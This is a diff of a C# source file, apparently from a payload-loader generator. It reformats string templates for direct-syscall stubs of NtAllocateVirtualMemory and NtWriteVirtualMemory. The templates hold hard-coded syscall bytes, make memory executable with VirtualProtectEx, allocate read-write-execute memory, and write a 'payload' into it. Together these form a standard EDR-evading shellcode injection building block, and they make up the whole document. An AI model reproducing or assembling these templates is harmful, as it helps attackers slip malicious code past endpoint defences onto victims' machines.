@@ -6,138 +6,138 @@
 
         #region NtAllocateVirtualMemory
         public static string method_NtAllocateVirtualMemory = @"
-static byte[] bNtAllocateVirtualMemory =
-{
-    0x4C, 0x8B, 0xD1,
-    0xB8, 0x18, 0x00, 0x00, 0x00,
-    0x0F, 0x05,
-    0xC3
-};
-
-public static uint NtAllocateVirtualMemory(
-    IntPtr ProcessHandle,
-    ref IntPtr BaseAddress,
-    IntPtr ZeroBits,
-    ref UIntPtr RegionSize,
-    uint AllocationType,
-    uint Protect)
-{
-    byte[] syscall = bNtAllocateVirtualMemory;
-
-    unsafe
-    {
-        fixed (byte* ptr = syscall)
+        static byte[] bNtAllocateVirtualMemory =
         {
-            IntPtr memoryAddress = (IntPtr)ptr;
+            0x4C, 0x8B, 0xD1,
+            0xB8, 0x18, 0x00, 0x00, 0x00,
+            0x0F, 0x05,
+            0xC3
+        };
 
-            if (!PInvokes.VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)syscall.Length, 0x40, out uint oldprotect))
+        public static uint NtAllocateVirtualMemory(
+            IntPtr ProcessHandle,
+            ref IntPtr BaseAddress,
+            IntPtr ZeroBits,
+            ref UIntPtr RegionSize,
+            uint AllocationType,
+            uint Protect)
+        {
+            byte[] syscall = bNtAllocateVirtualMemory;
+
+            unsafe
             {
-                throw new Win32Exception();
+                fixed (byte* ptr = syscall)
+                {
+                    IntPtr memoryAddress = (IntPtr)ptr;
+
+                    if (!PInvokes.VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)syscall.Length, 0x40, out uint oldprotect))
+                    {
+                        throw new Win32Exception();
+                    }
+
+                    Delegates.NtAllocateVirtualMemory assembledFunction = (Delegates.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtAllocateVirtualMemory));
+
+                    return assembledFunction(
+                        ProcessHandle,
+                        ref BaseAddress,
+                        ZeroBits,
+                        ref RegionSize,
+                        AllocationType,
+                        Protect);
+                }
             }
-
-            Delegates.NtAllocateVirtualMemory assembledFunction = (Delegates.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtAllocateVirtualMemory));
-
-            return assembledFunction(
-                ProcessHandle,
-                ref BaseAddress,
-                ZeroBits,
-                ref RegionSize,
-                AllocationType,
-                Protect);
-        }
-    }
-}";
+        }";
 
         public static string delegate_NtAllocateVirtualMemory = @"
-[UnmanagedFunctionPointer(CallingConvention.StdCall)]
-public delegate uint NtAllocateVirtualMemory(
-    IntPtr ProcessHandle,
-    ref IntPtr BaseAddress,
-    IntPtr ZeroBits,
-    ref UIntPtr RegionSize,
-    ulong AllocationType,
-    ulong Protect);";
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate uint NtAllocateVirtualMemory(
+                IntPtr ProcessHandle,
+                ref IntPtr BaseAddress,
+                IntPtr ZeroBits,
+                ref UIntPtr RegionSize,
+                ulong AllocationType,
+                ulong Protect);";
 
         public static string call_NtAllocateVirtualMemory = @"
-IntPtr pMemoryAllocation = new IntPtr();
-IntPtr pZeroBits = IntPtr.Zero;
-UIntPtr pAllocationSize = new UIntPtr(Convert.ToUInt32(payload.Length));
-uint allocationType = 0x3000;
-uint protection = 0x40;
-uint ntAllocResult = 0;
+            IntPtr pMemoryAllocation = new IntPtr();
+            IntPtr pZeroBits = IntPtr.Zero;
+            UIntPtr pAllocationSize = new UIntPtr(Convert.ToUInt32(payload.Length));
+            uint allocationType = 0x3000;
+            uint protection = 0x40;
+            uint ntAllocResult = 0;
 
-try
-{
-    ntAllocResult = Syscalls.NtAllocateVirtualMemory(hCurrentProcess, ref pMemoryAllocation, pZeroBits, ref pAllocationSize, allocationType, protection);
-}
-catch
-{
-    return;
-}";
+            try
+            {
+                ntAllocResult = Syscalls.NtAllocateVirtualMemory(hCurrentProcess, ref pMemoryAllocation, pZeroBits, ref pAllocationSize, allocationType, protection);
+            }
+            catch
+            {
+                return;
+            }";
         #endregion
 
         #region NtWriteVirtualMemory
 
         public static string method_NtWriteVirtualMemory = @"
-static byte[] bNtWriteVirtualMemory =
-{
-    0x4C, 0x8B, 0xD1,               // mov r10,rcx
-    0xB8, 0x3A, 0x00, 0x00, 0x00,   // mov eax,3ah
-    0x0F, 0x05,                     // syscall
-    0xC3                            // ret
-};
-
-public static uint NtWriteVirtualMemory(
-    IntPtr ProcessHandle,
-    IntPtr BaseAddress,
-    byte[] Buffer,
-    int BufferSize,
-    int NumberOfBytesWritten)
-{
-    byte[] syscall = bNtWriteVirtualMemory;
-
-    unsafe
-    {
-        fixed (byte* ptr = syscall)
+        static byte[] bNtWriteVirtualMemory =
         {
-            IntPtr memoryAddress = (IntPtr)ptr;
+            0x4C, 0x8B, 0xD1,               // mov r10,rcx
+            0xB8, 0x3A, 0x00, 0x00, 0x00,   // mov eax,3ah
+            0x0F, 0x05,                     // syscall
+            0xC3                            // ret
+        };
 
-            if (!PInvokes.VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)syscall.Length, 0x40, out uint oldprotect))
+        public static uint NtWriteVirtualMemory(
+            IntPtr ProcessHandle,
+            IntPtr BaseAddress,
+            byte[] Buffer,
+            int BufferSize,
+            int NumberOfBytesWritten)
+        {
+            byte[] syscall = bNtWriteVirtualMemory;
+
+            unsafe
             {
-                throw new Win32Exception();
+                fixed (byte* ptr = syscall)
+                {
+                    IntPtr memoryAddress = (IntPtr)ptr;
+
+                    if (!PInvokes.VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)syscall.Length, 0x40, out uint oldprotect))
+                    {
+                        throw new Win32Exception();
+                    }
+
+                    Delegates.NtWriteVirtualMemory assembledFunction = (Delegates.NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtWriteVirtualMemory));
+
+                    return assembledFunction(
+                        ProcessHandle,
+                        BaseAddress,
+                        Buffer,
+                        BufferSize,
+                        NumberOfBytesWritten);
+                }
             }
-
-            Delegates.NtWriteVirtualMemory assembledFunction = (Delegates.NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtWriteVirtualMemory));
-
-            return assembledFunction(
-                ProcessHandle,
-                BaseAddress,
-                Buffer,
-                BufferSize,
-                NumberOfBytesWritten);
-        }
-    }
-}";
+        }";
 
         public static string delegate_NtWriteVirtualMemory = @"
-[UnmanagedFunctionPointer(CallingConvention.StdCall)]
-public delegate uint NtWriteVirtualMemory(
-    IntPtr ProcessHandle,
-    IntPtr BaseAddress,
-    byte[] Buffer,
-    int BufferSize,
-    int NumberOfBytesWritten);";
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate uint NtWriteVirtualMemory(
+                IntPtr ProcessHandle,
+                IntPtr BaseAddress,
+                byte[] Buffer,
+                int BufferSize,
+                int NumberOfBytesWritten);";
 
         public static string call_NtWriteVirtualMemory = @"
-uint ntWVMResult = 0;
-try
-{
-    ntWVMResult = Syscalls.NtWriteVirtualMemory(hCurrentProcess, pMemoryAllocation, payload, payload.Length, 0);
-}
-catch
-{
-    return;
-}";
+            uint ntWVMResult = 0;
+            try
+            {
+                ntWVMResult = Syscalls.NtWriteVirtualMemory(hCurrentProcess, pMemoryAllocation, payload, payload.Length, 0);
+            }
+            catch
+            {
+                return;
+            }";
 
         #endregion
 
